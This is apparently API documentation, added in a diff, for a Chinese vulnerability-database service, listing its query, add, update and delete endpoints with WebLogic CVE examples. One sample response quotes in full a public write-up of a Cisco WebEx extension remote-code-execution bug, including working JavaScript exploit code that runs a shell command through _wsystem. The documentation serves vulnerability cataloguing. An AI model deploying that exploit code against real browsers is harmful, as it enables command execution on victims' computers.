@@ -1,0 +1,332 @@
+漏洞库
+============================================
+
+说明
+--------------------------------------
+1. API地址: http://47.114.129.62:18000
+2. 分为管理员和普通用户, 普通用户只可查询
+3. 角色模块此系统暂无
+4. 字段说明见【漏洞库查询(管理员和普通用户)响应结果中】
+5. <(?P<pk>[0-9]+)> 在此代表id
+
+漏洞库查询(管理员和普通用户)
+--------------------------------
+
+- GET /api/knowledge/loophole/?page=1&page_size=10
+- 请求参数::
+
+    {
+        "title": "weblogic" # 漏洞名称 | str | 选填 | 支持模糊搜索
+        "cve_num": "CVE-2014-4241" # CVE编号 | str | 选填 | 支持模糊搜索
+        "cnnvd_num": "CNNVD-201407-437" # CNNVD编号 | str | 选填 | 支持模糊搜索
+        "level": "1,2" # 威胁级别 | str | 选填 | 1:低危, 2:中危, 3:高危 | 多个,号隔开
+        "spub_time": "2019-05-31 00:00:00" # 发布开始时间 | time | 选填 | yyyy-MM-dd HH:mm:ss
+        "epub_time": "2019-05-31 00:00:00" # 发布结束时间 | time | 选填 | yyyy-MM-dd HH:mm:ss
+        "type": "缓冲区溢出" # 漏洞类型 | str | 选填 | 支持模糊搜索
+        "haspoc": true # 有无poc链接｜ bool | 选填 | true:有, false:无
+        "page": 1 # 页码 ｜ int | 选填 | 默认为 1
+        "page_size": 2 # 每页数 ｜ int | 选填 | 默认为 10
+    }
+
+- 响应结果::
+
+    {
+        "count": 54,
+        "next": "http://101.37.159.155:57001/api/knowledge/loophole/?level=&page=2&page_size=2&title=weblogic&type=",
+        "previous": null,
+        "results": [
+            {
+                "id": 81684,  # 编号
+                "insert_tm": "2021-06-03 17:35:42",
+                "update_tm": "2021-06-03 17:35:42",
+                "title": "Oracle WebLogic Server 远程安全漏洞(CVE-2014-4241)", # 漏洞名称
+                "pub_time": "2019-05-31 00:00:00", # 发布时间
+                "type": "缓冲区溢出", # 漏洞类型
+                "level": "中危", # 漏洞威胁级别
+                "cve_num": "CVE-2014-4241", # cve编号
+                "cnnvd_num": "CNNVD-201407-437", # cnnvd编号
+                "cvss_score": "0.0", # CVSS
+                "cnvd_num": null, # cnvd编号
+                "availability": "暂无数据", # 可利用性
+                "describe": "Oracle Weblogic Server是应用程序服务器。  Oracle Weblogic Server组件的实现上存在远程安全漏洞，此漏洞可通过HTTP协议利用，未经身份验证的远程攻击者可利用此漏洞影响受影响组件的完整性。该漏洞的影响版本包括：10.0.2.0, 10.3.6.0 ", # 漏洞描述
+                "solution": "Oracle已经为此发布了一个安全公告（cpujul2014-1972956）以及相应补丁:_x005f_x000D_\ncpujul2014-1972956：Oracle Critical Patch Update Advisory - July 2014_x005f_x000D_\n链接：http://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html", # 解决方案
+                "poclink": null, # poc 链接
+                "haspoc": false, # 是否有poc
+                "source": 2,
+                "reappearance":null # 复现
+            },
+            {
+                "id": 81600,
+                "insert_tm": "2021-06-03 17:34:51",
+                "update_tm": "2021-06-03 17:34:51",
+                "title": "Oracle Fusion Middleware WebLogic Server组件安全漏洞",
+                "pub_time": "2018-10-17 00:00:00",
+                "type": "其他",
+                "level": "高危",
+                "cve_num": "CVE-2018-3191",
+                "cnnvd_num": "CNNVD-201810-900",
+                "cvss_score": "5.8",
+                "cnvd_num": null,
+                "availability": "部分地",
+                "describe": "Oracle Fusion Middleware（Oracle融合中间件）是美国甲骨文（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件。Oracle Fusion Middleware中的WebLogic Server组件10.3.6.0版本、12.1.3.0版本和12.2.1.3版本的WLS Core Components子组件存在安全漏洞。攻击者可利用该漏洞控制组件，影响数据的保密性、完整性和可用性。",
+                "solution": "目前厂商已发布升级补丁以修复漏洞，补丁获取链接：_x005f_x000D_\nhttps://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html",
+                "poclink": null,
+                "haspoc": false,
+                "source": 2,
+                "reappearance":null # 复现
+            }
+        ]
+    }
+
+漏洞库详情查询(管理员和普通用户)
+--------------------------------
+
+- GET /api/knowledge/loophole/<(?P<pk>[0-9]+)>/
+
+- 请求参数::
+
+    None
+
+- 响应结果::
+
+    {
+        "code": 200,
+        "success": true,
+        "data": {
+            "id": 8179,
+            "insert_tm": "2021-06-03 08:48:49",
+            "update_tm": "2021-06-03 08:48:49",
+            "title": "CiscoWebEx-'nativeMessaging'RemoteCommandExecution",
+            "pub_time": "2017-01-23 16:00:00",
+            "type": null,
+            "level": null,
+            "cve_num": "",
+            "cnnvd_num": null,
+            "cvss_score": "0.0",
+            "cnvd_num": null,
+            "availability": null,
+            "describe": "<!--\nCisco's WebEx extension (jlhmfgmfgeifomenelglieieghnjghma) has ~20M active users, and is part of Cisco's popular web conferencing software.\n\nThe extension works on any URL that contains the magic pattern \"cwcsf-nativemsg-iframe-43c85c0d-d633-af5e-c056-32dc7efc570b.html\", which can be extracted from the extensions manifest. Note that the pattern can occur in an iframe, so there is not necessarily any user-visible indication of what is happening, visiting any website would be enough.\n\nThe extension uses nativeMessaging, so this magic string is enough for any website to execute arbitrary code (!!).\n\nThe protocol the extension uses is complicated, using CustomEvent() objects to pass JSON messages between the webpage, the extension and the native code.\n\nStepping through an initialization, a website must first request that the extension open a port for communication, like this:\n\ndocument.dispatchEvent(new CustomEvent(\"connect\", { detail: { token: \"token\" }})); // token can be any string\n\nThen messages can passed to native code via \"message\" events. Note that these cannot be MessageEvent() objects, and you cannot use the postMessage API, they have to be CustomEvent() objects.\n\nThere are a few different message types, such as \"hello\", \"disconnect\", etc. The most interesting is \"launch_meeting\":\n\n    document.dispatchEvent(new CustomEvent(\"message\", { detail: {\n            message: JSON.stringify(msg),\n            message_type: \"launch_meeting\",\n            timestamp: (new Date()).toUTCString(),\n            token: \"token\"\n        }\n    }));\n\nI stepped through a meeting and dumped the initialization messages:\n\n> message.message\n\"{\"DocshowVersion\": \"1.0\",\n\"FilterSecParameters\": \"clientparam;clientparam_value\",\n\"GpcProductRoot\": \"WebEx\",\n\"GpcMovingInSubdir\": \"Wanta\",\n\"GpcProductVersion\": \"T30_MC\",\n\"GpcUpgradeManagement\": \"false\",\n\"GpcCompatibleDesktopClients\": \"\",\n\"enableQuickLaunch\": \"1\",\n\"GpcProductDescription\": \"V2ViRXg=\",\n\"GpcUnpackName\": \"atgpcdec\",\n\"JMTSignificantFileList\": \"atgpcext.dll;atmccli.dll;comui.dll;webexmgr.dll;plugin-config.xml;atmgr.exe;ieatgpc.dll;atkbctl.dll;atwbxui15.dll;atcarmcl.dll;attp.dll;atarm.dll;wbxcrypt.dll;mmssl32.dll;libeay32.dll;ssleay32.dll;atmemmgr.dll;wcldll.dll;uilibres.dll;pfwres.dll;wbxtrace.dll;mcres.dll;atresec.dll;atrestc.dll;mfs.dll;mutilpd.dll;wseclient.dll;mticket.dll;wsertp.dll\",\n\"jmtclicklog\": \"1484862376664\",\n\"GpcExtName\": \"atgpcext\",\n\"GpcUnpackVersion\": \"27, 17, 2016, 501\",\n\"GpcExtVersion\": \"3015, 0, 2016, 1117\",\n\"GpcUrlRoot\": \"https://join-test.webex.com/client/WBXclient-T30L10NSP15EP1-10007/webex/self\",\n\"GpcComponentName\": \"YXRtY2NsaS5ETEw=\",\n\"GpcCompressMethod\": \"7z\",\n\"GpcActiveIniSection\": \"V2ViRXhfVg==\",\n\"GpcSupportPageUrl\": \"\",\n\"GpcIniFileName\": \"Z3BjLnBocD9wbW9kdWxlcz0lN0NNQ19TVEQlN0NDaGF0JTdDUG9sbGluZyU3Q05vdGUlN0NWaWRlb1NoYXJlJTdDV2ViZXhfUkElN0NBUyU3Q1BEJk9TPVZUJnJlcGxhY2VLZXk9VklTVEElN0NTU0YmTE49JmJhc2ljbmFtZT1XZWJFeF9WJk9TX0JpdD0zMg==\n...\n\nThere are a huge number of properties, many are obviously good candidates for code execution, but these jumped out at me:\n\n\"GpcComponentName\": \"YXRtY2NsaS5ETEw=\",\n\"GpcInitCall\": \"c3pDb29raWU9SW5pdENvbnRyb2woJUhXTkQpO05hbWVWYWx1ZShMb2dnaW5nVVJMX05hbWUsTG9nZ2luZ1VSTCk7TmFtZVZhbHVlKE1lZXRpbmdJRF9OYW1lLE1lZXRpbmdJRCk7TmFtZVZhbHVlKFNlc3Npb25JRF9OYW1lLFNlc3Npb25JRCk7TmFtZVZhbHVlKEdwY0luaUZpbGVOYW1lX05hbWUsR3BjSW5pRmlsZU5hbWUpO05hbWVWYWx1ZShHcGNVcmxSb290X05hbWUsR3BjVXJsUm9vdCk7TmFtZVZhbHVlKEdwY0V4dFZlcnNpb25fTmFtZSxHcGNFeHRWZXJzaW9uKTtOYW1lVmFsdWUoR3BjVW5wYWNrVmVyc2lvbl9OYW1lLEdwY1VucGFja1ZlcnNpb24pO05hbWVWYWx1ZShHcGNQcm9kdWN0Um9vdF9OYW1lLEdwY1Byb2R1Y3RSb290KTtOYW1lVmFsdWUobG9jYWxyb290c2VjdGlvbnZlcl9OYW1lLGxvY2Fscm9vdHNlY3Rpb252ZXIpO05hbWVWYWx1ZShSZWdUeXBlX05hbWUsUmVnVHlwZSk7TmFtZVZhbHVlKEdwY1Byb2dyZXNzQmFyVGl0bGVfTmFtZSxHcGNQcm9ncmVzc0JhclRpdGxlKTtOYW1lVmFsdWUoR3BjTWVzc2FnZVRpdGxlX05hbWUsR3BjTWVzc2FnZVRpdGxlKTtOYW1lVmFsdWUoZG93bmxvYWRsb2NhbHNldHRpbmdfTmFtZSxkb3dubG9hZGxvY2Fsc2V0dGluZyk7TmFtZVZhbHVlKHByb2R1Y3RuYW1lX05hbWUscHJvZHVjdG5hbWUpO05hbWVWYWx1ZShTRlN1cHBvcnRpbmdfTmFtZSxTRlN1cHBvcnRpbmdfVmFsdWUpO05hbWVWYWx1ZShNZWV0aW5nUmFuZG9tX05hbWUsTWVldGluZ1JhbmRvbSk7TmFtZVZhbHVlKGNsaWVudHBhcmFtX05hbWUsY2xpZW50cGFyYW1fVmFsdWUpO0ZpbmlzaENhbGwoc3pDb29raWUpOw==\",\n\nIf we decode those strings, we get:\n\nGpcComponentName: \"atmccli.DLL\"\nGpcInitCall: \"szCookie=InitControl(%HWND);NameValue(LoggingURL_Name,LoggingURL);NameValue(MeetingID_Name,MeetingID);NameValue(SessionID_Name,SessionID);NameValue(GpcIniFileName_Name,GpcIniFileName);NameValue(GpcUrlRoot_Name,GpcUrlRoot);NameValue(GpcExtVersion_Name,GpcExtVersion);NameValue(GpcUnpackVersion_Name,GpcUnpackVersion);NameValue(GpcProductRoot_Name,GpcProductRoot);NameValue(localrootsectionver_Name,localrootsectionver);NameValue(RegType_Name,RegType);NameValue(GpcProgressBarTitle_Name,GpcProgressBarTitle);NameValue(GpcMessageTitle_Name,GpcMessageTitle);NameValue(downloadlocalsetting_Name,downloadlocalsetting);NameValue(productname_Name,productname);NameValue(SFSupporting_Name,SFSupporting_Value);NameValue(MeetingRandom_Name,MeetingRandom);NameValue(clientparam_Name,clientparam_Value);FinishCall(szCookie);\"\n\nThat looks like some sort of weird scripting language. The presence of `HWND` suggests this is interacting with native code, and if I dump the exports of atmccli.DLL:\n\n$ dumpbin /nologo /exports atmccli.dll\n\nDump of file atmccli.dll\n\n    ordinal hint RVA      name\n\n          2    2 0001CC11 ExitControl\n         24    3 0001CC83 FinishCall\n          1    4 0001D2F9 InitControl <--\n         23    5 0001D556 NameValue\n...\n\nThese exports look like the functions being called in that scripting language. Is it possible it's calling those exports?\n\nI noticed that they ship a copy of the CRT (Microsoft's C Runtime, containing standard routines like printf, malloc, etc), so I tried calling the standard _wsystem() routime (like system(), but for WCHAR strings), like this:\n\nvar msg = {\n    GpcProductRoot: \"WebEx\",\n    GpcMovingInSubdir: \"Wanta\",\n    GpcProductVersion: \"T30_MC\",\n    GpcUnpackName: \"atgpcdec\",\n    GpcExtName: \"atgpcext\",\n    GpcUnpackVersion: \"27, 17, 2016, 501\",\n    GpcExtVersion: \"3015, 0, 2016, 1117\",\n    GpcUrlRoot: \"http://127.0.0.1/\",\n    GpcComponentName: btoa(\"MSVCR100.DLL\"),\n    GpcSuppressInstallation: btoa(\"True\"),\n    GpcFullPage: \"True\",\n    GpcInitCall: btoa(\"_wsystem(ExploitShellCommand);\"),\n    ExploitShellCommand: btoa(\"calc.exe\"),\n}\n\nUnbelievably, that worked.\n\nExample exploit attached.\n\nI uploaded a demo here for testing (this URL is secret)\n\nhttps://lock.cmpxchg8b.com/ieXohz9t/\n\n(You can make sure WebEx is installed and working first by going here. You don't need to register, just enter any name and email)\n\nhttps://www.webex.com/test-meeting.html\n-->\n\n<html>\n<head>\n<title>Cisco WebEx Exploit</title>\n<script>\nvar msg = {\n    GpcProductRoot: \"WebEx\",\n    GpcMovingInSubdir: \"Wanta\",\n    GpcProductVersion: \"T30_MC\",\n    GpcUnpackName: \"atgpcdec\",\n    GpcExtName: \"atgpcext\",\n    GpcUnpackVersion: \"27, 17, 2016, 501\",\n    GpcExtVersion: \"3015, 0, 2016, 1117\",\n    GpcUrlRoot: \"http://127.0.0.1/\",\n    GpcComponentName: btoa(\"MSVCR100.DLL\"),\n    GpcSuppressInstallation: btoa(\"True\"),\n    GpcFullPage: \"True\",\n    GpcInitCall: btoa(\"_wsystem(ExploitShellCommand);\"),\n    ExploitShellCommand: btoa(\"calc.exe\"),\n}\n\nfunction runcode()\n{\n    if (!document.location.pathname.endsWith(\"cwcsf-nativemsg-iframe-43c85c0d-d633-af5e-c056-32dc7efc570b.html\")) {\n        alert(\"document /must/ be named cwcsf-nativemsg-iframe-43c85c0d-d633-af5e-c056-32dc7efc570b.html\");\n        return;\n    }\n\n    if (!document.location.protocol.endsWith(\"https:\")) {\n        alert(\"document /must/ be served over https\");\n        return;\n    }\n\n    document.dispatchEvent(new CustomEvent(\"connect\", { detail: { token: \"token\" }}));\n    document.dispatchEvent(new CustomEvent(\"message\", { detail: {\n            message: JSON.stringify(msg),\n            message_type: \"launch_meeting\",\n            timestamp: (new Date()).toUTCString(),\n            token: \"token\"\n        }\n    }));\n}\n</script>\n</head>\n<body onload=\"runcode()\">\n<h1>Running exploit...</h1>\n</body>\n</html>",
+            "solution": null,
+            "poclink": "https://www.exploit-db.com/download/41148",
+            "haspoc": true,
+            "source": 1,
+            "reappearance":null # 复现
+        },
+        "message": "查询成功！"
+    }
+
+漏洞库数据数量(管理员和普通用户)
+--------------------------------
+
+- GET /api/knowledge/loophole/get_count/
+
+- 请求参数::
+
+    None
+
+- 响应结果::
+
+    {
+        "code": 200,
+        "success": true,
+        "data": {
+            "total": 81790, # 总计
+            "poc_num": 41968, # 有poc的数量
+            "cve_num": 81790, # 有cve编号的数量
+            "cnnvd_num": 47929 # 有cnnvd编号的数量
+        }
+    }
+
+
+漏洞库新增(管理员)
+--------------------------------
+
+- POST /api/knowledge/loophole/
+
+- 请求参数::
+
+    {
+        "title": "Oracle Fusion Middleware WebLogic Server组件安全漏洞", # 漏洞名称 | str | 必填
+        "pub_time": "2018-10-17 00:00:00", # 发布时间 | time | 必填 | yyyy-MM-dd HH:mm:ss
+        "type": "其他",  # 漏洞名称 | str
+        "level": 1,# 威胁级别 | int | 选填 | 1:低危, 2:中危, 3:高危
+        "cve_num": "CVE-2018-3191",
+        "cnnvd_num": "CNNVD-201810-900",
+        "cvss_score": "5.8", # cvss评分 | float | 选填 | 0.0~10.0
+        "cnvd_num": null,
+        "availability": 1, # 威胁级别 | int | 选填 | 0:暂无数据, 1:完全地, 2:部分地, 3:不受影响地
+        "describe": "Oracle Fusion Middleware（Oracle融合中间件）是美国甲骨文（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件。Oracle Fusion Middleware中的WebLogic Server组件10.3.6.0版本、12.1.3.0版本和12.2.1.3版本的WLS Core Components子组件存在安全漏洞。攻击者可利用该漏洞控制组件，影响数据的保密性、完整性和可用性。",
+        "solution": "目前厂商已发布升级补丁以修复漏洞，补丁获取链接：_x005f_x000D_\nhttps://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html",
+        "poclink":"http://baidu.com", # poc链接地址 或文本内容
+        "reappearance":"复现过程" # 复现| str | 选填
+    }
+
+- 响应结果::
+
+    {
+        "code": 200,
+        "success": true,
+        "data": {
+            "id": 81806,
+            "cvss_score": 5.8,
+            "insert_tm": "2021-08-02 14:43:17",
+            "update_tm": "2021-08-02 14:43:17",
+            "title": "Oracle Fusion Middleware WebLogic Server组件安全漏洞",
+            "pub_time": "2018-10-17 00:00:00",
+            "type": "其他",
+            "level": 1,
+            "cve_num": "CVE-2018-3191",
+            "cnnvd_num": "CNNVD-201810-900",
+            "cnvd_num": null,
+            "availability": 1,
+            "describe": "Oracle Fusion Middleware（Oracle融合中间件）是美国甲骨文（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件。Oracle Fusion Middleware中的WebLogic Server组件10.3.6.0版本、12.1.3.0版本和12.2.1.3版本的WLS Core Components子组件存在安全漏洞。攻击者可利用该漏洞控制组件，影响数据的保密性、完整性和可用性。",
+            "solution": "目前厂商已发布升级补丁以修复漏洞，补丁获取链接：_x005f_x000D_\nhttps://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html",
+            "poclink": "http://baidu.com",
+            "haspoc": true,
+            "source": 3,
+            "reappearance":null # 复现
+        }
+    }
+
+
+
+漏洞库更新(管理员)
+--------------------------------
+
+- PUT /api/knowledge/loophole/<(?P<pk>[0-9]+)>/
+
+- 请求参数::
+
+    {
+        "title": "Oracle Fusion Middleware WebLogic Server组件安全漏洞",
+        "pub_time": "2018-10-17 00:00:00",
+        "type": "其他",
+        "level": 1,
+        "cve_num": "CVE-2018-3191",
+        "cnnvd_num": "CNNVD-201810-900",
+        "cvss_score": "5.8",
+        "cnvd_num": null,
+        "availability": 1,
+        "describe": "Oracle Fusion Middleware（Oracle融合中间件）是美国甲骨文（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件。Oracle Fusion Middleware中的WebLogic Server组件10.3.6.0版本、12.1.3.0版本和12.2.1.3版本的WLS Core Components子组件存在安全漏洞。攻击者可利用该漏洞控制组件，影响数据的保密性、完整性和可用性。",
+        "solution": "目前厂商已发布升级补丁以修复漏洞，补丁获取链接：_x005f_x000D_\nhttps://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html",
+        "poclink":"http://baidu.com",
+        "reappearance":null # 复现
+    }
+- 参数说明::
+
+    以上参数均为可选参数
+
+- 响应结果::
+
+    {
+        "code": 200,
+        "success": true,
+        "data": {
+            "id": 81803,
+            "cvss_score": 5.8,
+            "insert_tm": "2021-08-02 14:14:37",
+            "update_tm": "2021-08-02 14:57:16",
+            "title": "Oracle Fusion Middleware WebLogic Server组件安全漏洞",
+            "pub_time": "2018-10-17 00:00:00",
+            "type": "其他",
+            "level": 1,
+            "cve_num": "CVE-2018-3191",
+            "cnnvd_num": "CNNVD-201810-900",
+            "cnvd_num": null,
+            "availability": 1,
+            "describe": "Oracle Fusion Middleware（Oracle融合中间件）是美国甲骨文（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件。Oracle Fusion Middleware中的WebLogic Server组件10.3.6.0版本、12.1.3.0版本和12.2.1.3版本的WLS Core Components子组件存在安全漏洞。攻击者可利用该漏洞控制组件，影响数据的保密性、完整性和可用性。",
+            "solution": "目前厂商已发布升级补丁以修复漏洞，补丁获取链接：_x005f_x000D_\nhttps://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html",
+            "poclink": "http://baidu.com",
+            "haspoc": true,
+            "source": 3,
+            "reappearance":null # 复现
+        }
+    }
+
+
+漏洞库单个删除(管理员)
+--------------------------------
+
+- DELETE /api/knowledge/loophole/<(?P<pk>[0-9]+)>/
+
+- 请求参数::
+
+    None
+
+- 响应结果::
+
+    {
+        "code": 200,
+        "success": true,
+        "data": []
+    }
+
+漏洞库批量删除(管理员)
+--------------------------------
+
+- DELETE /api/knowledge/loophole/multiple_delete/
+
+- 请求参数::
+
+    {
+        "ids":[81805,81804] # id数组 | list | 必填
+    }
+
+- 响应结果::
+
+    {
+        "code": 200,
+        "success": true,
+        "data": {
+            "del_num": 1  # 批量删除成功的数量
+        },
+        "message": "删除成功！"
+    }
+
+
+
+漏洞库查询手机端(管理员和普通用户)
+-----------------------------------------------
+
+- GET /api/knowledge/loopholes/search
+- 请求参数::
+
+    {
+        "q": "weblogic" # 关键词 | str | 选填 | 支持模糊搜索
+        "page": 1 # 页码 ｜ int | 选填 | 默认为 1
+        "page_size": 2 # 每页数 ｜ int | 选填 | 默认为 10
+    }
+
+- 响应结果::
+
+    {
+        "count": 1,
+        "next": null,
+        "previous": null,
+        "results": [
+            {
+                "text": "Oracle WebLogic Server 安全漏洞(CVE-2017-3248)\nCVE-2017-3248\nCNNVD-201701-581",
+                "highlighted": "Oracle WebLogic Server 安全漏洞(<em>CVE</em>-<em>2017</em>-<em>3248</em>)\n<em>CVE</em>-<em>2017</em>-<em>3248</em>\nCNNVD-201701-581",  #  高亮数据
+                "object": {
+                    "id": 4607,
+                    "insert_tm": "2021-06-03 08:47:07",
+                    "update_tm": "2021-06-03 08:47:07",
+                    "title": "Oracle WebLogic Server 安全漏洞(CVE-2017-3248)",
+                    "pub_time": "2017-06-25 00:00:00",
+                    "type": "缓冲区溢出",
+                    "level": "高危",
+                    "cve_num": "CVE-2017-3248",
+                    "cnnvd_num": "CNNVD-201701-581",
+                    "cvss_score": "7.5",
+                    "cnvd_num": null,
+                    "availability": "部分地",
+                    "describe": "Oracle Fusion Middleware中的Oracle WebLogic Server组件的Core Components子组件存在安全漏洞。攻击者可利用该漏洞控制组件，影响数据的保密性，完整性及可用性。以下版本受到影响：Oracle WebLogic Server 10.3.6.0版本，12.1.3.0版本，12.2.1.0版本，12.2.1.1版本。",
+                    "solution": "目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接：http://www.oracle.com/technetwork/security-advisory/cpujan2017-2881727.html",
+                    "poclink": "https://www.exploit-db.com/download/44998",
+                    "haspoc": true,
+                    "source": 2,
+                    "reappearance": null
+                }
+            }
+        ]
+    }
